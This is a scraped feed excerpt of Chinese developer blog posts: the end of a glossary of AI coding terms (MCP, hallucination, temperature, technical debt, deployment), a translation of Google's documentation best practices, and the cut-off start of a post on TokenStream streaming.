<p>比如“用户登录”和 <code>function authenticateUser()</code> 看起来字不一样，但经过嵌入后，它们在数字空间里会离得很近——因为意思差不多。</p>
<p>正是靠这个，向量数据库才能做到“语义搜索”：你搜一个概念，它能找到干同一件事但命名不同的代码。</p>
<p>你不用搞懂它怎么算的，只要记住： <strong>嵌入是让 AI 能“理解意思”而不是“死抠字眼”的底层技术</strong>，也是 RAG、智能代码补全这些功能能跑起来的关键。</p>
</blockquote>
<h4 data-id="heading-41"><code>MCP</code> 模型上下文协议</h4>
<blockquote>
<p><code>MCP</code>（Model Context Protocol）说白了，就是给 AI 世界定了个“通用插口”——就像 USB 之于电脑。</p>
<p>以前，每个工具（比如数据库、<code>Figma</code>、<code>GitHub</code>）都得单独给 AI 写一套对接代码，费时又重复。 现在有了 <code>MCP</code> 这个开放标准，只要工具按这个协议“插上”，<strong>所有支持 <code>MCP</code> 的 AI（比如 Claude Code、Cursor 等）都能直接用它</strong>，不用再一个个适配。</p>
<p>在 Vibe Coding 里，这等于给 AI 开了外挂：</p>
<ul>
<li>接上 <strong><code>Figma MCP</code></strong>，AI 能直接看设计稿，自动生成网页代码；</li>
<li>接上 <strong><code>GitHub MCP</code></strong>，它能自己提 PR、查 issue、同步仓库；</li>
<li>接上 <strong>数据库 <code>MCP</code></strong>，它能查真实业务数据，边分析边写逻辑。</li>
</ul>
<p>关键不是“AI 变聪明了”，而是它终于能<strong>安全、标准地连上你的真实工作环境</strong>。 <code>MCP</code> 不是功能，而是让各种功能能被轻松“即插即用”的底座——从此 AI 不再困在聊天框里，而是真正走进你的开发流。</p>
</blockquote>
<h3 data-id="heading-42">AI 输出相关</h3>
<h4 data-id="heading-43">AI 幻觉</h4>
<blockquote>
<p>AI 幻觉，说白了就是 AI “一本正经地胡说八道”—— 比如给你一个根本不存在的函数名、瞎编某个库的用法，或者信口开河说“这个 <code>API</code> 支持 <code>XXX</code>”，其实压根没有。</p>
<p>这不是它故意骗你，而是大模型天生靠“猜概率”说话：只要听起来合理，哪怕没这回事，它也可能脱口而出。</p>
<p><strong>怎么防？几个土办法很管用：</strong></p>
<ul>
<li><strong>让它交证据</strong>：直接问“这 <code>API</code> 有官方文档吗？发链接看看”；</li>
<li><strong>自己动手查</strong>：别全信，关键地方翻一遍官网或源码；</li>
<li><strong>换个人问</strong>：换个模型（比如从 <code>Claude</code> 换到 <code>GPT</code>）看说法是否一致；</li>
<li><strong>重启对话</strong>：有时候上下文乱了会带偏 AI，新开一个窗口重说需求，反而更准。</li>
</ul>
<p>记住：AI 是个聪明但爱脑补的实习生，<strong>你可以用它的效率，但得守住你的判断</strong>。</p>
</blockquote>
<h4 data-id="heading-44">温度</h4>
<blockquote>
<p>“温度”就是 AI 的“脑洞开关”。</p>
<ul>
<li><strong>温度调低（比如 0.1）</strong> ：AI 变得一本正经、按部就班，输出稳定、靠谱——写代码就该这样，少整花活，别瞎创新。</li>
<li><strong>温度调高（比如 1.0+）</strong> ：AI 开始放飞自我，想法多但容易跑偏，适合聊创意、想点子，但不适合写能跑的代码。</li>
</ul>
<p>所以编程时，一般把温度压低点—— 你不是要一个诗人，而是一个守规矩的程序员。</p>
</blockquote>
<h4 data-id="heading-45">流式输出</h4>
<blockquote>
<p>流式输出，就是 AI 边想边说，字一个一个蹦出来给你看—— 不像以前非得等它憋完一大段才显示。</p>
<p>好处很明显： 你一眼看出它跑偏了（比如开始写错框架、用错 <code>API</code>），<strong>立马点停止</strong>，省时间、省 Token，也少生气。</p>
<p>这就像跟人聊天时对方一句句说，你随时能插话：“打住，不是这个意思！” 而不是等他讲完十分钟小作文，才发现全答错了。</p>
<p>现在主流 AI 编程工具基本都默认开流式，体验更自然，也更可控——毕竟，<strong>快反馈比完美输出更重要</strong>。</p>
</blockquote>
<h3 data-id="heading-46">项目管理概念</h3>
<h4 data-id="heading-47">MVP（最小可行产品）</h4>
<blockquote>
<p>MVP 就是“先做个能用的最小版本，别一上来就想造宇宙”。</p>
<p>核心就一点：<strong>只做最必要的功能，先把核心问题解决掉</strong>。</p>
<p>比如你想做个记账 <code>App</code>，MVP 可能就俩功能：</p>
<ul>
<li>能记一笔花了多少钱</li>
<li>能看到所有记录</li>
</ul>
<p>别的像图表分析、多账户同步、自动分类……统统先砍掉。</p>
<p>好处很明显：</p>
<ul>
<li>一周就能跑起来，不用搞三个月；</li>
<li>马上拿给用户试，看他们到底用不用、卡在哪；</li>
<li>如果没人用，亏的时间也少；如果真有用，再加功能也不迟。</li>
</ul>
<p>说白了，MVP 不是“做简陋”，而是<strong>用最低成本验证你是不是在干一件值得干的事</strong>。</p>
</blockquote>
<h4 data-id="heading-48">迭代开发</h4>
<blockquote>
<p>迭代开发，说白了就是“<strong>先跑起来，再慢慢升级</strong>”。</p>
<p>别想着一口吃成胖子，而是把大项目拆成一个个小版本： 每个周期就干几件事——定个小目标、让 AI 写代码、你测一测、发个可用版、收点反馈、再优化。</p>
<p>在 Vibe Coding 里特别顺手： 你先让 AI 实现最核心的功能（比如“能登录”），跑通了、没问题， 再下一轮加“找回密码”，再下一轮加“第三方登录”…… 一步步来，每步都可控、可测、可停。</p>
<p>这样既避免 AI 一次性搞太复杂而翻车，也让你能及时调整方向—— 毕竟，<strong>跑得快不如跑得稳，改得快才是真敏捷</strong>。</p>
</blockquote>
<h4 data-id="heading-49">重构</h4>
<blockquote>
<p>重构，就是给代码“做整理、不做改动”——功能一模一样，但让它变得更干净、更好懂、更好改。</p>
<p>比如：</p>
<ul>
<li>把重复的几行抽成一个函数</li>
<li>把 <code>a1</code>、<code>tmp</code> 这种名字改成 <code>userEmail</code>、<code>isValid</code></li>
<li>把嵌套八层的 if 拆清爽</li>
<li>把 500 行的大文件切成几个小模块</li>
</ul>
<p>在 Vibe Coding 里，你可以直接让 AI 帮你干这事，比如：“把这段逻辑提取成独立函数，并重命名变量让它更清晰”。</p>
<p>但记住一点：<strong>一次只动一小块，改完马上测</strong>。 别让 AI 一口气“优化”整个项目——看着爽，跑起来崩，反而更难修。</p>
<p>重构不是炫技，是为了让代码活得更久、改得更快。</p>
</blockquote>
<h4 data-id="heading-50">技术债</h4>
<blockquote>
<p>技术债，说白了就是“<strong>现在图快，以后遭罪</strong>”。</p>
<p>比如为了赶上线，你让 AI 生成一段能跑但乱糟糟的代码：逻辑硬编码、没注释、重复一堆…… 当时是快了，但以后每次改功能、修 bug，都得在泥潭里打滚——改一处，崩三处。</p>
<p>这就像刷信用卡：今天爽了，明天连本带利还，越拖利息越高。 AI 写代码尤其容易埋这种雷——它只管“跑通”，不管“好不好改”。</p>
<p>所以得定期<strong>主动还债</strong>：</p>
<ul>
<li>每隔一阵子，挑关键模块让 AI 帮你重构；</li>
<li>别等代码烂到没人敢动才动手；</li>
<li>把“整洁可维护”当成需求的一部分，不是可选项。</li>
</ul>
<p>记住：<strong>省下的那点时间，迟早会以十倍代价还回去</strong>。 别让 AI 帮你堆出一座“屎山”，再聪明的助手也救不了。</p>
</blockquote>
<h4 data-id="heading-51">版本控制</h4>
<blockquote>
<p>版本控制，就是给代码装“后悔药”和“时光机”。</p>
<p>你每改一次代码，它都记下来：谁改的、改了啥、为啥改。 要是 AI 一通操作把项目搞崩了，你不用抓狂重写——<strong>一键退回上个好用的版本就行</strong>。</p>
<p>Git 是干这活儿最常用的工具，<code>GitHub</code> 则是大家存代码、协作的地方。</p>
<p>在 Vibe Coding 里，这玩意儿尤其关键： 你让 AI 大改一通，结果跑不起来？别慌，<code>git checkout</code> 回退一下，世界清净。 甚至可以开个新分支让 AI 随便试，搞砸了也不影响主代码。</p>
<p>说白了：<strong>有版本控制，你才敢放手让 AI 干活；没它，等于蒙眼走钢丝</strong>。</p>
</blockquote>
<h4 data-id="heading-52">部署</h4>
<blockquote>
<p>部署，说白了就是“<strong>把做好的东西搬上线，让人能用上</strong>”。</p>
<p>你本地写完代码，用户可看不见——得把它传到服务器上跑起来。 现在这事比以前简单多了，基本不用自己配服务器，直接用现成平台：</p>
<ul>
<li><strong><code>Vercel</code></strong>：前端、<code>Next.js</code> 项目一键上线，连数据库都能带；</li>
<li><strong><code>Netlify</code></strong>：静态网站、<code>React/Vue</code> 项目秒部署，还送免费域名和 <code>CDN</code>；</li>
<li><strong>Railway / Render</strong>：后端 <code>API</code>、Node/Python 服务扔上去就能跑；</li>
<li>甚至像 <strong><code>Bolt.new</code></strong> 这类零代码工具，点个按钮就自动部署+生成链接。</li>
</ul>
<p>在 Vibe Coding 时代，很多 AI 工具还能自动帮你打包、推送到这些平台——你只管写需求，它连上线都包了。</p>
<p>但记住：<strong>能跑 ≠ 能用</strong>。部署只是第一步，监控、日志、错误处理这些也得跟上。不过至少，现在“上线”这件事，真的不再是个门槛了。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[文档最佳实践（Google 风格指南）]]></title>    <link>https://juejin.cn/post/7602303923170328585</link>    <guid>https://juejin.cn/post/7602303923170328585</guid>    <pubDate>2026-02-03T06:56:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602303923170328585" data-draft-id="7602447286606315529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="文档最佳实践（Google 风格指南）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T06:56:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="暖阳_"/> <meta itemprop="url" content="https://juejin.cn/user/1662117312465406"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            文档最佳实践（Google 风格指南）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1662117312465406/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    暖阳_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:56:08.000Z" title="Tue Feb 03 2026 06:56:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">文档最佳实践（Google 风格指南）</h2>
<p><strong>原文链接</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fdocguide%2Fbest_practices.html" target="_blank" title="https://google.github.io/styleguide/docguide/best_practices.html" ref="nofollow noopener noreferrer">google.github.io/styleguide/…</a></p>
<hr/>
<p>“言简意赅，直抒己见。” —— <a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FThe_Elements_of_Programming_Style" target="_blank" title="https://en.wikipedia.org/wiki/The_Elements_of_Programming_Style" ref="nofollow noopener noreferrer">Brian Kernighan</a></p>
<h3 data-id="heading-1">目录</h3>
<ol>
<li><a href="#1-%E6%9C%80%E5%B0%8F%E5%8F%AF%E8%A1%8C%E6%96%87%E6%A1%A3" title="#1-%E6%9C%80%E5%B0%8F%E5%8F%AF%E8%A1%8C%E6%96%87%E6%A1%A3">最小可行文档</a></li>
<li><a href="#2-%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%90%8C%E6%AD%A5%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3" title="#2-%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%90%8C%E6%AD%A5%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3">与代码同步更新文档</a></li>
<li><a href="#3-%E5%88%A0%E9%99%A4%E5%A4%B1%E6%95%88%E6%96%87%E6%A1%A3" title="#3-%E5%88%A0%E9%99%A4%E5%A4%B1%E6%95%88%E6%96%87%E6%A1%A3">删除失效文档</a></li>
<li><a href="#4-%E5%AE%81%E8%A6%81%E5%A5%BD%E4%B8%8D%E6%B1%82%E5%AE%8C%E7%BE%8E" title="#4-%E5%AE%81%E8%A6%81%E5%A5%BD%E4%B8%8D%E6%B1%82%E5%AE%8C%E7%BE%8E">宁要好，不求完美</a></li>
<li><a href="#5-%E6%96%87%E6%A1%A3%E6%98%AF%E4%BB%A3%E7%A0%81%E7%9A%84%E6%95%85%E4%BA%8B" title="#5-%E6%96%87%E6%A1%A3%E6%98%AF%E4%BB%A3%E7%A0%81%E7%9A%84%E6%95%85%E4%BA%8B">文档是代码的故事</a></li>
<li><a href="#6-%E9%87%8D%E5%A4%8D%E6%98%AF%E9%AD%94%E9%AC%BC" title="#6-%E9%87%8D%E5%A4%8D%E6%98%AF%E9%AD%94%E9%AC%BC">重复是魔鬼</a></li>
</ol>
<hr/>
<h3 data-id="heading-2">1. 最小可行文档</h3>
<p>少量新鲜、准确的文档，胜过一大堆处于各种“半残”状态的“文档”。</p>
<p>写短小、有用的文档。删掉一切不必要的内容，包括过时、错误或冗余的信息。养成习惯，持续打磨和优化每份文档以适配变化中的需求。<strong>文档最好像盆景一样：保持鲜活，并经常修剪。</strong></p>
<p>另见 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.agilemodeling.com%2Fessays%2FagileDocumentationBestPractices.htm" target="_blank" title="https://www.agilemodeling.com/essays/agileDocumentationBestPractices.htm" ref="nofollow noopener noreferrer">敏捷文档最佳实践</a>。</p>
<h3 data-id="heading-3">2. 与代码同步更新文档</h3>
<p><strong>在提交代码变更的同一份 CL 里修改文档</strong>。这样文档才能保持新鲜，也是向评审者说明你在做什么的好地方。</p>
<p>好的评审者至少会要求：docstring、头文件、README.md 以及其它相关文档随 CL 一起更新。</p>
<h3 data-id="heading-4">3. 删除失效文档</h3>
<p>失效文档有害：误导读者、拖慢节奏、让工程师沮丧、让团队负责人懈怠，还会为在代码库里留下烂摊子开先例。家里干净，客人多半也会自觉保持干净。</p>
<p>就像任何大扫除一样，<strong>很容易被压垮</strong>。如果文档状况很差：</p>
<ul>
<li>放慢节奏，文档健康是日积月累的事。</li>
<li>先删掉你确定错误的内容，拿不准的先别动。</li>
<li>让整个团队参与，花时间快速扫一遍每份文档，做一个简单决定：保留还是删除？</li>
<li>迁移时默认删除或弃用；掉队的内容总可以再找回来。</li>
<li>反复迭代。</li>
</ul>
<h3 data-id="heading-5">4. 宁要好，不求完美</h3>
<p>文档是一门艺术。没有完美的文档，只有经过验证的方法和审慎的指南。参见 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fdocguide%2Fstyle.html" target="_blank" title="https://google.github.io/styleguide/docguide/style.html" ref="nofollow noopener noreferrer">Better is better than best</a>。</p>
<h3 data-id="heading-6">5. 文档是代码的故事</h3>
<p>写出优秀代码并不止于“能编译”甚至“测试覆盖 100%”。写一段机器能懂的东西不难，难的是写出一段人和机器都能懂的东西。作为注重代码健康的工程师，你的使命是<strong>先为人写，再为机器写</strong>。文档是这项能力的重要一环。</p>
<p>工程文档有一整条光谱，从简短的注释到详尽的说明：</p>
<ol>
<li><strong>有意义的命名</strong>：好的命名能让代码自己传达信息，否则这些信息只能写在注释或文档里。这包括各个层级的可命名实体：局部变量、类、文件、目录。</li>
<li><strong>行内注释</strong>：行内注释的主要目的是提供代码本身无法表达的信息，例如<strong>这段代码为什么存在</strong>。</li>
<li><strong>方法与类注释</strong>：
<ul>
<li><strong>方法 API 文档</strong>：头文件 / Javadoc / docstring 中说明方法做什么、怎么用。这类文档是<strong>代码行为契约</strong>。受众是将来会使用和修改你代码的程序员。通常可以要求：这里文档化的行为都应有测试验证。文档应说明：参数、返回值、“坑”或限制、可能抛出的异常或返回的错误。一般不必解释“为什么这样实现”，除非对开发者理解用法有帮助；“为什么”留给行内注释。写方法文档时想得实际一点：“这是一把锤子，用来钉钉子。”</li>
<li><strong>类 / 模块 API 文档</strong>：类或整个文件的头文件 / Javadoc / docstring。简要概述类/文件做什么，并常附带几个简短使用示例。当类有多种用法（有的简单、有的高级）时，示例尤其有用。<strong>始终把最简单的用法写在最前面。</strong></li>
</ul>
</li>
<li><strong>README.md</strong>：好的 README.md 能帮新用户快速了解该目录，并指向更详细的说明和用户指南：
<ul>
<li>这个目录打算放什么？</li>
<li>开发者应先看哪些文件？有没有是 API？</li>
<li>谁在维护这个目录，哪里可以了解更多？
参见 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fdocguide%2FREADMEs.html" target="_blank" title="https://google.github.io/styleguide/docguide/READMEs.html" ref="nofollow noopener noreferrer">README.md 指南</a>。</li>
</ul>
</li>
<li><strong>docs 目录</strong>：好的 docs 目录应说明如何：
<ul>
<li>上手使用相关 API、库或工具。</li>
<li>运行测试。</li>
<li>调试输出。</li>
<li>发布产物。</li>
</ul>
</li>
<li><strong>设计文档、PRD</strong>：好的设计文档或 PRD 会详细讨论拟议实现，以便收集对设计的反馈。但代码实现后，设计文档应作为这些决策的<strong>档案</strong>，而不是半对半错的“活文档”（后者常被误用）。</li>
<li><strong>其它外部文档</strong>：有些团队在代码库之外维护文档（如 Google Sites、Drive、wiki）。若你也在别处维护文档，应在项目目录里<strong>明确指向</strong>这些位置（例如在项目的 <code>README.md</code> 里加上醒目的链接）。</li>
</ol>
<h3 data-id="heading-7">6. 重复是魔鬼</h3>
<p>不要为通用的技术或流程另写一份自己的指南，<strong>链到已有文档即可</strong>。若指南不存在或严重过时，向对应目录提交更新，或写一份包级 README.md。<strong>主动负责、不必害羞</strong>：其它团队通常会很欢迎你的贡献。</p>
<p>本站为开源项目。<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle%2Fstyleguide%2Fedit%2Fgh-pages%2Fdocguide%2Fbest_practices.md" target="_blank" title="https://github.com/google/styleguide/edit/gh-pages/docguide/best_practices.md" ref="nofollow noopener noreferrer">改进本页</a>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 工具调用流式开发，TokenStream 才是正确选择]]></title>    <link>https://juejin.cn/post/7602191709388619818</link>    <guid>https://juejin.cn/post/7602191709388619818</guid>    <pubDate>2026-02-03T04:36:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602191709388619818" data-draft-id="7602201748229570579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 工具调用流式开发，TokenStream 才是正确选择"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T04:36:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XuCoder"/> <meta itemprop="url" content="https://juejin.cn/user/948203954903908"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 工具调用流式开发，TokenStream 才是正确选择
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/948203954903908/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XuCoder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:36:15.000Z" title="Tue Feb 03 2026 04:36:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol 